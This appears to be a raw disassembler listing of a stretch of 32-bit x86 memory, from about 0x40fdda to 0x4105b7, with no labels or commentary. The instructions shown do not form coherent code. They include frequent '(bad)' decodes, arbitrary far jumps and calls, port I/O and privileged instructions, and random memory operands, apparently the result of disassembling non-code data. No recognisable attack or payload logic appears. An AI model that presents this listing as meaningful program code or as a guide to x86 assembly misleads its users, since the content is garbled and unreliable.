  40fdda:	cmp    DWORD PTR [edx+0x49c5fb93],0xffffff8f
  40fde1:	retf   
  40fde2:	jb     0x40fdbd
  40fde4:	fisttp QWORD PTR [esp+esi*8]
  40fde7:	mov    ds:0x214a8b8b,al
  40fdec:	mov    WORD PTR [esi-0x22a2475c],ds
  40fdf2:	dec    edx
  40fdf3:	(bad)
  40fdf6:	cmp    bh,BYTE PTR [edi-0x79]
  40fdf9:	xchg   ecx,eax
  40fdfa:	or     BYTE PTR [ebx+0x78],cl
  40fdfd:	pop    ss
  40fdfe:	ficomp WORD PTR [ecx+0x75a2ccc3]
  40fe04:	fisub  DWORD PTR [eax+0x24]
  40fe07:	add    ch,BYTE PTR [eax]
  40fe09:	test   eax,0xf37732c
  40fe0e:	inc    esp
  40fe0f:	cwde   
  40fe10:	fs mov dl,0x18
  40fe13:	js     0x40fe62
  40fe15:	dec    ecx
  40fe16:	out    dx,al
  40fe17:	inc    edx
  40fe18:	aaa    
  40fe19:	(bad)  
  40fe1a:	fistp  WORD PTR [edx-0x3b]
  40fe1d:	aaa    
  40fe1e:	mov    bh,0xb1
  40fe20:	push   esp
  40fe21:	outs   dx,BYTE PTR ds:[esi]
  40fe22:	jecxz  0x40fe77
  40fe24:	xor    BYTE PTR [ebp+0x5a640ee4],0xa4
  40fe2b:	mov    edi,0xd62b8ecb
  40fe30:	mov    esi,0x62f3fa13
  40fe35:	dec    ecx
  40fe36:	out    0x18,eax
  40fe38:	gs mov al,0xd2
  40fe3b:	fwait
  40fe3c:	mov    ah,0xc
  40fe3e:	xlat   BYTE PTR ds:[ebx]
  40fe3f:	rcl    DWORD PTR gs:[edi+edx*8+0x5b],0x42
  40fe45:	jecxz  0x40fe9d
  40fe47:	mov    ds:0x4f10d606,al
  40fe4c:	test   BYTE PTR [edx],bh
  40fe4e:	dec    edi
  40fe4f:	add    eax,0xab2ab6b6
  40fe54:	adc    eax,0xfe2f478c
  40fe59:	out    dx,al
  40fe5a:	maskmovq mm5,(bad)
  40fe5b:	imul   DWORD PTR [ecx]
  40fe5d:	loop   0x40fe8c
  40fe5f:	sbb    al,0xcf
  40fe61:	sub    dl,BYTE PTR [ebx+0x31]
  40fe64:	outs   dx,BYTE PTR ds:[esi]
  40fe65:	int    0xd
  40fe67:	inc    edi
  40fe68:	mov    BYTE PTR [esi],bl
  40fe6a:	cwde   
  40fe6b:	jl     0x40fdf8
  40fe6d:	mov    bh,0xea
  40fe6f:	jecxz  0x40fe6b
  40fe71:	add    edi,ebp
  40fe73:	xchg   esp,eax
  40fe74:	cli    
  40fe75:	inc    edx
  40fe76:	outs   dx,DWORD PTR ds:[esi]
  40fe77:	mov    ah,0x9e
  40fe79:	stc    
  40fe7a:	dec    esp
  40fe7b:	clc    
  40fe7c:	enter  0xd58,0xc9
  40fe80:	imul   ebx,DWORD PTR [ecx-0x117c452d],0xffffff95
  40fe87:	pop    ds
  40fe88:	sub    dl,BYTE PTR [ebx]
  40fe8a:	retf   
  40fe8b:	dec    esp
  40fe8c:	stos   DWORD PTR es:[edi],eax
  40fe8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe8e:	jle    0x40fec7
  40fe90:	jae    0x40fee1
  40fe92:	xlat   BYTE PTR ds:[ebx]
  40fe93:	jg     0x40feb4
  40fe95:	clc    
  40fe96:	mov    ch,al
  40fe98:	cmp    edi,DWORD PTR [ecx+eiz*8+0x31]
  40fe9c:	cmp    DWORD PTR ds:0x7601f204,esi
  40fea2:	lahf   
  40fea3:	cmp    ebp,DWORD PTR [ebp+0x14]
  40fea6:	nop
  40fea7:	adc    eax,0xc955c55c
  40feac:	les    eax,FWORD PTR [eax]
  40feae:	xchg   ecx,eax
  40feaf:	ror    BYTE PTR [ebx],1
  40feb1:	inc    ecx
  40feb2:	outs   dx,DWORD PTR ds:[esi]
  40feb3:	aad    0x40
  40feb5:	jp     0x40fe59
  40feb7:	fdiv   DWORD PTR [ebx+0x73344b0b]
  40febd:	fcomp  QWORD PTR [esi-0x21]
  40fec0:	cmp    bl,BYTE PTR ds:0xbd11fbc
  40fec6:	mov    eax,es:0x2961d310
  40fecc:	(bad)  
  40fecd:	das    
  40fece:	popf   
  40fecf:	call   0xa06:0x65a5badc
  40fed6:	lods   eax,DWORD PTR ds:[esi]
  40fed7:	adc    al,0xe9
  40fed9:	aam    0xff
  40fedb:	xchg   ecx,eax
  40fedc:	adc    al,0x4a
  40fede:	inc    ecx
  40fedf:	xchg   ebp,eax
  40fee0:	clc    
  40fee1:	jmp    0x9b2a:0x8774c59b
  40fee8:	leave  
  40fee9:	sbb    BYTE PTR [ebx],0x77
  40feec:	loope  0x40febf
  40feee:	shl    BYTE PTR [ebp-0xf],1
  40fef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef2:	in     al,0x48
  40fef4:	adc    bh,bh
  40fef6:	jbe    0x40fee9
  40fef8:	aad    0xb1
  40fefa:	pop    ebp
  40fefb:	or     dl,0x6d
  40fefe:	js     0x40feb2
  40ff00:	adc    al,0xae
  40ff02:	add    cl,bh
  40ff04:	popa   
  40ff05:	sub    eax,0x1ecdad00
  40ff0a:	xchg   edi,eax
  40ff0b:	imul   esi,ebp,0x41cafd12
  40ff11:	inc    esp
  40ff12:	and    bh,BYTE PTR [esi-0x19]
  40ff15:	inc    edi
  40ff16:	xchg   WORD PTR [ebx+ebp*8-0x70],ax
  40ff1b:	jl     0x40fefc
  40ff1d:	fiadd  WORD PTR [edx+0x63a9e934]
  40ff23:	inc    edi
  40ff24:	lock jae 0x40ff4c
  40ff27:	mov    esi,0xcc875f87
  40ff2c:	icebp  
  40ff2d:	xor    DWORD PTR [edi],0x36
  40ff30:	add    dl,dl
  40ff32:	sar    BYTE PTR [edx],cl
  40ff34:	adc    al,0x83
  40ff36:	ret    0xb329
  40ff39:	add    DWORD PTR [edx+ecx*8-0x29c2b4e5],ebp
  40ff40:	adc    ecx,DWORD PTR [edi]
  40ff42:	mov    esp,0xb262eb96
  40ff47:	lea    edi,[edx+0x44]
  40ff4a:	jb     0x40fee6
  40ff4c:	sub    BYTE PTR [eax],dl
  40ff4e:	int    0x92
  40ff50:	int3   
  40ff51:	jmp    0xe17ed57f
  40ff56:	push   edx
  40ff57:	cli    
  40ff58:	aas    
  40ff59:	adc    ah,bh
  40ff5b:	mov    dl,dh
  40ff5d:	rol    DWORD PTR [eax-0x5b47fffd],cl
  40ff63:	retf   
  40ff64:	cmp    DWORD PTR [eax-0xd],esp
  40ff67:	mov    WORD PTR [ecx+0x2cf8eef0],es
  40ff6d:	lods   eax,DWORD PTR ds:[esi]
  40ff6e:	fldenv [eax]
  40ff70:	xor    cl,0xd9
  40ff73:	mov    edi,0x7a732a3c
  40ff78:	push   ecx
  40ff79:	imul   edx,DWORD PTR [ecx-0x40],0xffffffc0
  40ff7d:	xlat   BYTE PTR ds:[ebx]
  40ff7e:	xchg   ebx,eax
  40ff7f:	lods   eax,DWORD PTR ds:[esi]
  40ff80:	and    ebx,0x2b
  40ff83:	lds    ebp,FWORD PTR [ebp-0x20]
  40ff86:	jne    0x40ff52
  40ff88:	or     eax,0xfc08778e
  40ff8d:	cmp    DWORD PTR [edi+eiz*2+0x9bafbc],0x50
  40ff95:	mov    al,ds:0xf9f8832e
  40ff9a:	test   BYTE PTR [esi+0x59fabf23],bh
  40ffa0:	mov    eax,ds:0x19859c37
  40ffa5:	adc    al,0x70
  40ffa7:	pop    ebp
  40ffa8:	and    esp,DWORD PTR [edx]
  40ffaa:	scas   eax,DWORD PTR es:[edi]
  40ffab:	push   eax
  40ffac:	bound  edx,QWORD PTR [ebx+0x6e]
  40ffaf:	in     eax,dx
  40ffb0:	push   ds
  40ffb1:	push   0x9427ff46
  40ffb6:	mov    al,ds:0xef73a5a5
  40ffbb:	pop    di
  40ffbd:	das    
  40ffbe:	addr16 call 0x6315:0xa05b5d0e
  40ffc6:	mov    ecx,0xd6f81158
  40ffcb:	jecxz  0x410028
  40ffcd:	or     eax,0x49f28489
  40ffd2:	enter  0xb60e,0x21
  40ffd6:	in     eax,dx
  40ffd7:	test   esi,ebp
  40ffd9:	lea    edx,[edi-0x14eb6605]
  40ffdf:	arpl   WORD PTR [eax],si
  40ffe1:	f2xm1  
  40ffe3:	and    BYTE PTR [esi+ecx*2+0x4f],al
  40ffe7:	dec    edi
  40ffe8:	dec    ebp
  40ffe9:	outs   dx,DWORD PTR ds:[esi]
  40ffea:	(bad)  
  40ffeb:	xchg   esi,eax
  40ffec:	fisttp QWORD PTR [edx]
  40ffee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffef:	hlt    
  40fff0:	pop    ss
  40fff1:	push   esp
  40fff2:	xchg   ecx,eax
  40fff3:	cmp    DWORD PTR [edi-0x2b370dbd],esp
  40fff9:	mov    esi,0xe8b1075a
  40fffe:	int3   
  40ffff:	cmp    bh,BYTE PTR [ebp-0x72]
  410002:	sub    ah,BYTE PTR [ebp-0x31]
  410005:	bound  esi,QWORD PTR [ebp+0x49736b32]
  41000b:	jle    0x40ffe5
  41000d:	jge    0x41005e
  41000f:	or     al,0xf2
  410011:	loop   0x40ffcb
  410013:	inc    ebx
  410014:	dec    esp
  410015:	inc    esp
  410016:	sbb    al,0xc6
  410018:	sub    bl,BYTE PTR [eax]
  41001a:	pop    edx
  41001b:	icebp  
  41001c:	jmp    FWORD PTR [esi+eiz*4-0x10]
  410020:	push   ebp
  410021:	(bad)  
  410023:	fisttp QWORD PTR ds:0xc9e55ee5
  410029:	jmp    0x410020
  41002b:	cs jne 0x40ffdc
  41002e:	cmp    esi,eax
  410030:	adc    ch,al
  410032:	xor    eax,0xa757d82e
  410037:	jbe    0x40fff5
  410039:	arpl   WORD PTR [ecx*1-0x1dcf3101],sp
  410040:	rcr    DWORD PTR [ecx+0x7abc10a6],1
  410046:	sub    dl,BYTE PTR ds:0x5983bd42
  41004c:	repz mov dl,0x96
  41004f:	iret   
  410050:	xchg   ebx,eax
  410051:	sti    
  410052:	inc    ecx
  410053:	fs jmp 0xbd72:0x44d0d193
  41005b:	mov    esi,0x9f60edf8
  410060:	nop
  410061:	mov    edi,0x1cd6f028
  410066:	inc    esi
  410067:	push   esi
  410068:	sar    DWORD PTR [edx],cl
  41006a:	cmp    eax,0xc93df016
  41006f:	(bad)  
  410070:	aad    0xa8
  410072:	mov    edx,0xb37d343a
  410077:	push   ebx
  410078:	fidiv  DWORD PTR [edi+0x50c9581d]
  41007e:	jne    0x4100f1
  410080:	or     eax,0x75ef6823
  410085:	mov    cl,0xd0
  410087:	dec    ebx
  410088:	push   0x887a02a3
  41008d:	fs jl  0x41003d
  410090:	mov    esp,0x92ef689d
  410095:	ret    
  410096:	mov    dh,0xf0
  410098:	dec    esi
  410099:	jmp    0x2ed36005
  41009e:	hlt    
  41009f:	cld    
  4100a0:	jb     0x4100c6
  4100a2:	dec    ebp
  4100a3:	add    esp,esi
  4100a5:	fucomi st,st(4)
  4100a7:	and    eax,DWORD PTR [edx-0x13]
  4100aa:	xchg   BYTE PTR [ecx-0x66b9c806],bh
  4100b0:	add    eax,0xbdb3f35c
  4100b5:	dec    edi
  4100b6:	imul   edi,DWORD PTR [eax+0x49],0xb57720e7
  4100bd:	in     eax,dx
  4100be:	scas   eax,DWORD PTR es:[edi]
  4100bf:	and    al,0x1b
  4100c1:	push   ebx
  4100c2:	rol    BYTE PTR [edi+0x1a],cl
  4100c5:	and    BYTE PTR [edi-0x198e033e],bl
  4100cb:	jg     0x410071
  4100cd:	mov    WORD PTR [eax-0x4f],gs
  4100d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100d1:	(bad)  
  4100d2:	(bad)  
  4100d4:	and    DWORD PTR [ebp-0x7cd64c39],edx
  4100da:	inc    BYTE PTR [eax-0x7c]
  4100dd:	enter  0xabf4,0x5a
  4100e1:	push   ebp
  4100e2:	popf   
  4100e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100e4:	jmp    DWORD PTR [eax+esi*8-0x87e8ac9]
  4100eb:	push   ds
  4100ec:	into   
  4100ed:	sub    al,0x75
  4100ef:	fldcw  WORD PTR [edx]
  4100f1:	scas   al,BYTE PTR es:[edi]
  4100f2:	pop    edi
  4100f3:	inc    edi
  4100f4:	(bad)  
  4100f5:	nop
  4100f6:	xor    DWORD PTR [ebx+edi*4+0x36c391a8],esi
  4100fd:	mov    edi,0x585df5b3
  410102:	mov    al,0x6b
  410104:	cld    
  410105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410106:	xchg   edi,eax
  410107:	mov    ecx,0xbefe9b6c
  41010c:	cmp    bl,BYTE PTR [ecx+0x1f9f9bfd]
  410112:	mov    bh,0xa4
  410114:	mov    dl,0x69
  410116:	cld    
  410117:	inc    ecx
  410118:	pushf  
  410119:	mov    DWORD PTR [ebp+ebp*8-0x4f],ebp
  41011d:	div    DWORD PTR [ebp+ebx*2+0x8]
  410121:	jo     0x410153
  410123:	sub    al,0xa5
  410125:	fild   DWORD PTR [edx-0x7f]
  410128:	xchg   DWORD PTR [ebx+0xc],edi
  41012b:	dec    ebx
  41012c:	out    0xc8,eax
  41012e:	ds xchg ebp,eax
  410130:	inc    ebx
  410131:	add    esi,DWORD PTR [bp+si]
  410134:	mov    ch,0x9d
  410136:	rol    BYTE PTR [esi],1
  410138:	mov    edi,0xf9a7f758
  41013d:	fcomi  st,st(2)
  41013f:	xlat   BYTE PTR ds:[ebx]
  410140:	or     eax,0xbd57708a
  410145:	int    0x41
  410147:	mov    eax,ds:0xf706c45
  41014c:	add    eax,0x3fa70dc4
  410151:	push   cs
  410152:	mov    al,0xf8
  410154:	or     eax,0xeb54aefd
  410159:	daa    
  41015a:	jg     0x410138
  41015c:	adc    al,0x5d
  41015e:	data16 into 
  410160:	pop    edx
  410161:	push   0xd722556a
  410166:	and    eax,0x3d74dae4
  41016b:	imul   edi,DWORD PTR [ecx+edi*8+0x7d],0x55d1d02b
  410173:	dec    edi
  410174:	lahf   
  410175:	mov    ch,0x86
  410177:	fadd   QWORD PTR [edi]
  410179:	jo     0x410198
  41017b:	mov    edx,0x1a1290b3
  410180:	mov    esp,0x57b42754
  410185:	or     ch,BYTE PTR [ebx+0x1c]
  410188:	add    edi,ebx
  41018a:	jno    0x410139
  41018c:	outs   dx,DWORD PTR ds:[esi]
  41018e:	or     ebp,DWORD PTR ds:0x485a6f27
  410194:	add    ecx,ebx
  410196:	mov    cl,0x12
  410198:	inc    edx
  410199:	dec    esi
  41019a:	fst    DWORD PTR [ecx]
  41019c:	pop    edi
  41019d:	and    DWORD PTR [esi-0x4942396d],ebx
  4101a3:	push   ebx
  4101a4:	add    eax,0x9664d29b
  4101a9:	lods   eax,DWORD PTR ds:[esi]
  4101aa:	push   ds
  4101ab:	push   esp
  4101ac:	push   es
  4101ad:	(bad)  
  4101ae:	push   0xffffff87
  4101b0:	jp     0x410140
  4101b2:	mov    BYTE PTR [ebx+0x3c],dl
  4101b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101b6:	int3   
  4101b7:	sti    
  4101b8:	jnp    0x410192
  4101ba:	mov    ebx,0xc0737c9
  4101bf:	jmp    0x41017d
  4101c1:	sub    DWORD PTR [ebx],ebx
  4101c3:	or     edx,0x6d8b1c19
  4101c9:	nop
  4101ca:	push   0x99dbc6dd
  4101cf:	mov    eax,ds:0xd4ef941
  4101d4:	cdq    
  4101d5:	mov    eax,ds:0x2e1b9ff5
  4101da:	(bad)  
  4101dc:	mov    ecx,0xecf0fb5c
  4101e1:	in     eax,dx
  4101e2:	test   DWORD PTR [eax],edi
  4101e4:	(bad)  
  4101e5:	adc    eax,0x9d919ebd
  4101ea:	(bad)  
  4101eb:	outs   dx,BYTE PTR ds:[esi]
  4101ec:	adc    eax,0x918a4246
  4101f1:	jnp    0x4101a9
  4101f3:	popf   
  4101f4:	mov    al,0x6e
  4101f6:	in     eax,0x3a
  4101f8:	adc    BYTE PTR [ebx+esi*2-0x23],al
  4101fc:	add    dl,BYTE PTR [edi]
  4101fe:	and    ebp,DWORD PTR [edi+0x4ab9897a]
  410204:	enter  0xa3d8,0x10
  410208:	cmp    eax,DWORD PTR [edi+0x7c]
  41020b:	aad    0xb1
  41020d:	sbb    BYTE PTR [edi-0x5b2551aa],al
  410213:	test   DWORD PTR [ebp-0x23],0x4e147ace
  41021a:	mov    al,ds:0xf1752914
  41021f:	push   ecx
  410220:	mov    ah,0x5a
  410222:	mov    edi,0x8d4ae854
  410227:	fisttp DWORD PTR [ebx+0x5e]
  41022a:	pop    es
  41022b:	and    BYTE PTR [ebx-0x60],ah
  41022e:	lock aad 0xa6
  410231:	retf   
  410232:	sub    al,0xfa
  410234:	mov    DWORD PTR [esp+esi*1],edx
  410237:	je     0x410281
  410239:	mov    bh,ch
  41023b:	test   al,0x65
  41023d:	jno    0x410266
  41023f:	popf   
  410240:	dec    ebp
  410241:	mov    dl,cl
  410243:	cdq    
  410244:	(bad)  
  410245:	out    0xbc,eax
  410247:	fcom   DWORD PTR [ecx+0x7be65bf7]
  41024d:	int3   
  41024e:	sbb    cl,0xca
  410251:	mov    dl,0x94
  410253:	mov    ch,0xc9
  410255:	(bad)  
  410256:	in     eax,dx
  410257:	imul   al
  410259:	cdq    
  41025a:	inc    ebx
  41025b:	mov    al,ds:0x8b4bbeed
  410260:	ret    
  410261:	inc    ecx
  410262:	out    0xbc,al
  410264:	lods   eax,DWORD PTR ds:[esi]
  410265:	cs or  eax,0xdc7382eb
  41026b:	sub    esp,DWORD PTR [ecx]
  41026d:	xchg   esp,eax
  41026f:	sti    
  410270:	jmp    0x5c21:0xd1d11a84
  410277:	(bad)  
  410278:	push   ebx
  410279:	cmp    bh,cl
  41027b:	aam    0x43
  41027d:	fidivr DWORD PTR [edx+0x33]
  410280:	sbb    edi,esp
  410282:	stc    
  410283:	int    0xc
  410285:	jbe    0x41024d
  410287:	data16 aad 0x5c
  41028a:	int3   
  41028b:	inc    eax
  41028c:	xor    BYTE PTR [ecx],al
  41028e:	xor    ch,al
  410290:	pop    ss
  410291:	(bad)  [edx]
  410293:	dec    ebp
  410294:	pop    ecx
  410295:	in     al,0xe8
  410297:	ror    DWORD PTR [ecx+0x1f0fb4ac],1
  41029d:	stos   BYTE PTR es:[edi],al
  41029e:	sub    bh,BYTE PTR [ebx-0x2c]
  4102a1:	test   DWORD PTR [esi+0x42],eax
  4102a4:	ret    
  4102a5:	mul    BYTE PTR [eax+0x24b3a72d]
  4102ab:	std    
  4102ac:	cmp    al,0xb4
  4102ae:	pop    esp
  4102af:	mov    BYTE PTR [esi],al
  4102b1:	hlt    
  4102b2:	push   ds
  4102b3:	sub    dl,0x4b
  4102b6:	loop   0x410337
  4102b8:	cmc    
  4102b9:	les    edi,FWORD PTR [ebx+0x4078d351]
  4102bf:	(bad)  
  4102c0:	sar    DWORD PTR [ebp+0x6aef6610],cl
  4102c6:	pop    esi
  4102c7:	xor    cl,BYTE PTR [eax-0x2fcaa6b8]
  4102cd:	std    
  4102ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102cf:	mov    eax,0x29959f4c
  4102d4:	into   
  4102d5:	shl    ebx,1
  4102d7:	fdivp  st(7),st
  4102d9:	adc    bh,cl
  4102db:	jg     0x4102b8
  4102dd:	jns    0x410355
  4102df:	xchg   esi,eax
  4102e0:	push   ss
  4102e1:	int3   
  4102e2:	repnz xor DWORD PTR [ebx+0x3f5fb001],edi
  4102e9:	xor    DWORD PTR [edi],edi
  4102eb:	mov    dl,0x3b
  4102ed:	loop   0x41034f
  4102ef:	js     0x410316
  4102f1:	adc    eax,0x2c5314b5
  4102f6:	repz adc ch,BYTE PTR [ebx]
  4102f9:	ja     0x41034e
  4102fb:	dec    esp
  4102fc:	test   DWORD PTR [eax],esp
  4102fe:	call   0x8215:0x3713b24e
  410305:	xor    DWORD PTR [ecx+ebp*1+0x64],ebp
  410309:	and    al,BYTE PTR [edi-0x6c187de5]
  41030f:	mov    ecx,0x35036edb
  410314:	retf   
  410315:	scas   eax,DWORD PTR es:[edi]
  410316:	gs imul esp,DWORD PTR ss:[edi],0x152ad36d
  41031e:	icebp  
  41031f:	and    BYTE PTR [esi],bh
  410321:	adc    al,0xdc
  410323:	aad    0xa
  410325:	jmp    0xc60d:0x7bc3827c
  41032c:	pop    esp
  41032d:	daa    
  41032e:	bound  ebp,QWORD PTR [ebp+0x40]
  410331:	loop   0x41038f
  410333:	add    eax,0xa0858f5b
  410338:	mov    ebp,0x48abed90
  41033d:	sbb    eax,0xc184faa
  410342:	xor    DWORD PTR [esp-0x1e3b079a],ebx
  410349:	(bad)  
  41034a:	enter  0x3732,0xbe
  41034e:	iret   
  41034f:	inc    esi
  410350:	mov    bh,0x12
  410352:	jae    0x410399
  410354:	ror    DWORD PTR [edi+edx*4-0x792cf8d2],0x58
  41035c:	add    ebp,DWORD PTR [edi]
  41035e:	shl    ebp,1
  410360:	rol    ch,cl
  410362:	adc    BYTE PTR [ebp-0x5cd222c4],dl
  410368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410369:	(bad)  
  41036a:	jbe    0x410338
  41036c:	loope  0x41033a
  41036e:	push   ebp
  41036f:	clc    
  410370:	mov    esp,0x8d1da68e
  410375:	dec    eax
  410376:	es jbe 0x410344
  410379:	or     DWORD PTR [eax],ecx
  41037b:	(bad)  
  41037c:	and    DWORD PTR [ebx+0x2b],ebp
  41037f:	sar    DWORD PTR [ebx-0x62],0x8f
  410383:	sub    al,0xd3
  410385:	cdq    
  410386:	and    al,0x38
  410388:	mov    dl,0xbb
  41038a:	int3   
  41038b:	inc    esi
  41038c:	test   eax,0x1c4c05cf
  410391:	jecxz  0x41034e
  410393:	cmp    eax,0xac34a332
  410398:	(bad)  
  410399:	in     al,0xed
  41039b:	jae    0x4103a0
  41039d:	push   cs
  41039e:	cmp    eax,0xdea58b45
  4103a4:	pop    edi
  4103a5:	inc    bx
  4103a7:	data16 fcom QWORD PTR [esp+ebp*1]
  4103ab:	or     al,0x88
  4103ad:	mov    edi,DWORD PTR [ebp+esi*1-0x15326f31]
  4103b4:	ret    
  4103b5:	or     dh,bh
  4103b7:	sbb    DWORD PTR [ebx],ecx
  4103b9:	iret   
  4103ba:	sub    bh,BYTE PTR [edx-0x56]
  4103bd:	retf   0x9eb2
  4103c0:	call   0xe81d:0x54cd79ff
  4103c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103c8:	out    0xce,al
  4103ca:	add    eax,0x7f854fbb
  4103cf:	jbe    0x4103df
  4103d1:	mov    al,0xb8
  4103d3:	test   BYTE PTR [ecx+0x17b2f50a],0x7b
  4103da:	dec    edi
  4103db:	leave  
  4103dc:	test   eax,0xb1943389
  4103e1:	addr16 popa 
  4103e3:	xor    al,0xd9
  4103e5:	retf   0x71d2
  4103e8:	jno    0x410413
  4103ea:	loopne 0x4103cc
  4103ec:	jbe    0x410466
  4103ee:	and    ebp,DWORD PTR [ecx-0x15]
  4103f1:	xchg   esp,ebp
  4103f3:	mov    ch,0x84
  4103f5:	cmp    al,0xc3
  4103f7:	js     0x410400
  4103f9:	pop    ebx
  4103fa:	jecxz  0x41046b
  4103fc:	shl    BYTE PTR [ebp+0x25182fc0],1
  410402:	ja     0x410448
  410404:	(bad)  
  410405:	cli    
  410406:	sahf   
  410407:	pop    edx
  410408:	pop    ebp
  410409:	outs   dx,DWORD PTR ds:[esi]
  41040a:	add    dl,bh
  41040c:	or     al,0xc0
  41040e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410410:	jecxz  0x41039d
  410412:	ret    0xdc43
  410415:	fst    QWORD PTR [eax+0x3e]
  410418:	jne    0x41043f
  41041a:	popf   
  41041b:	add    dh,BYTE PTR [ecx+0x11]
  41041e:	cmp    DWORD PTR [ebx-0x13670ca4],edi
  410424:	jnp    0x41043c
  410426:	and    al,0x46
  410428:	xchg   ebx,eax
  410429:	stos   BYTE PTR es:[edi],al
  41042a:	jo     0x4103ba
  41042c:	inc    esi
  41042d:	and    eax,0x3fcfcf0a
  410432:	fs cmp al,0x7d
  410435:	dec    ebp
  410436:	sbb    edx,DWORD PTR [eax+eiz*4]
  410439:	lods   eax,DWORD PTR ds:[esi]
  41043a:	mov    ds:0xae7fb3e3,eax
  41043f:	sbb    esp,esp
  410441:	fs xchg ebx,eax
  410443:	pop    ds
  410444:	(bad)  
  410445:	xchg   edi,eax
  410446:	or     eax,0x89536e8e
  41044b:	or     DWORD PTR [edx-0x1a0c1835],esi
  410451:	ins    BYTE PTR es:[edi],dx
  410452:	push   ss
  410453:	add    BYTE PTR [ebp-0x60],0xcf
  410457:	mov    ch,0x9b
  410459:	xchg   edi,eax
  41045a:	add    eax,0x632c296a
  41045f:	test   edx,ebx
  410461:	mov    dl,0xf0
  410463:	jg     0x4103f6
  410465:	rcl    BYTE PTR [edi+0x4076004a],1
  41046b:	icebp  
  41046c:	sar    DWORD PTR [edx+0x73],1
  41046f:	xor    edx,eax
  410471:	fcom   QWORD PTR [eax+0x5f0628a4]
  410477:	(bad)  
  410478:	fbstp  TBYTE PTR [ebx+esi*8-0x19]
  41047c:	pop    eax
  41047d:	xchg   DWORD PTR [edx],ebp
  41047f:	(bad)  [ecx+0x45756cf3]
  410485:	xor    BYTE PTR [eax+edx*1-0x79],bl
  410489:	xlat   BYTE PTR ds:[ebx]
  41048a:	in     eax,0x64
  41048c:	test   DWORD PTR [ebp-0x16],esi
  41048f:	adc    bl,0xa9
  410492:	xchg   ecx,eax
  410493:	jg     0x4104e2
  410495:	out    dx,eax
  410496:	leave  
  410497:	pop    edx
  410498:	jbe    0x410516
  41049a:	cmp    BYTE PTR ds:0xa42cc2e2,0x2c
  4104a1:	pop    edx
  4104a2:	or     DWORD PTR [ebp-0x74d23750],esp
  4104a8:	sub    ah,BYTE PTR [edi-0x3d5d260a]
  4104ae:	push   eax
  4104af:	cwde   
  4104b0:	jecxz  0x41052f
  4104b2:	std    
  4104b3:	aam    0x21
  4104b5:	pop    es
  4104b6:	sbb    al,bl
  4104b8:	ins    BYTE PTR es:[edi],dx
  4104b9:	(bad)  
  4104ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104bb:	mov    ebx,0x87293bc8
  4104c0:	xlat   BYTE PTR ds:[ebx]
  4104c1:	repnz push ebp
  4104c3:	sbb    DWORD PTR [edx+0x4b713a6e],edi
  4104c9:	fild   DWORD PTR [edi+0x37362fe2]
  4104cf:	repz test BYTE PTR [edx-0x706c186d],bl
  4104d6:	and    BYTE PTR [edx-0xb],0xd9
  4104da:	in     al,dx
  4104db:	push   edi
  4104dc:	add    dh,BYTE PTR [edi+esi*4-0x30ff12a]
  4104e3:	rep outs dx,DWORD PTR ds:[esi]
  4104e5:	or     eax,0x66a3116d
  4104ea:	daa    
  4104eb:	mov    bl,bl
  4104ed:	out    0xaa,al
  4104ef:	retf   
  4104f0:	mov    cl,0x37
  4104f2:	cli    
  4104f3:	dec    esi
  4104f4:	ret    0xb9fa
  4104f7:	je     0x41056c
  4104f9:	add    ecx,esi
  4104fb:	scas   al,BYTE PTR es:[edi]
  4104fc:	jae    0x4104a9
  4104fe:	push   esi
  4104ff:	es (bad) 
  410501:	rol    bl,cl
  410503:	and    DWORD PTR [edi],ebp
  410505:	lods   eax,DWORD PTR ds:[esi]
  410506:	sub    al,0xb8
  410508:	sahf   
  410509:	test   BYTE PTR ds:0x3ffb821c,ah
  41050f:	out    dx,al
  410510:	sbb    eax,0x6e4f9bbd
  410515:	and    cl,dh
  410517:	mov    BYTE PTR [edi+0x28ca093],dh
  41051d:	in     eax,dx
  41051e:	imul   ebx,edx,0x8cb43a36
  410524:	mov    ds:0x8b3b2246,al
  410529:	fisubr WORD PTR [ecx+eiz*8]
  41052c:	into   
  41052d:	mov    ds:0xad0c4316,al
  410532:	lahf   
  410533:	clc    
  410534:	mov    ebx,0x4220568a
  410539:	mov    bh,0x89
  41053b:	scas   al,BYTE PTR es:[edi]
  41053c:	jo     0x41050a
  41053e:	aad    0x95
  410540:	loop   0x4104fe
  410542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410543:	loope  0x410577
  410545:	or     BYTE PTR [ebp+esi*1+0x748a6832],dl
  41054c:	lea    edx,[edx+0x48dd6adf]
  410552:	and    ebx,DWORD PTR [edx+0x7e2ab1a]
  410558:	mov    esp,0x2ee4ba9
  41055d:	mov    dh,0x21
  41055f:	daa    
  410560:	dec    ebp
  410561:	idiv   BYTE PTR [edx+0x3c]
  410564:	xor    DWORD PTR [ebx-0x80],ebp
  410567:	sbb    eax,0x872e8e50
  41056c:	popf   
  41056d:	aas    
  41056e:	(bad)  
  41056f:	jno    0x410591
  410571:	inc    esp
  410572:	mov    eax,0x4721094f
  410577:	fadd   QWORD PTR [esi-0x39467f4f]
  41057d:	jnp    0x41055b
  41057f:	dec    ebx
  410580:	fdiv   QWORD PTR [ecx+ebx*2+0xe9ba927]
  410587:	inc    eax
  410588:	repnz imul eax,DWORD PTR ds:0x946e5eb4,0xffffffb4
  410590:	push   cs
  410591:	mov    edi,0xd81b1ac8
  410596:	rcl    DWORD PTR [ecx],0x80
  410599:	jae    0x410539
  41059b:	repnz mov edx,0x60511f24
  4105a1:	inc    eax
  4105a2:	icebp  
  4105a3:	adc    BYTE PTR [ebx+eax*4-0xf],al
  4105a7:	inc    edi
  4105a8:	mov    WORD PTR [esi+0x1b],ds
  4105ab:	mov    al,0x31
  4105ad:	int3   
  4105ae:	jb     0x41054f
  4105b0:	aam    0x1e
  4105b2:	mov    eax,ds:0x87f07e21
  4105b7:	mov    DWORD PTR [eax],ebx
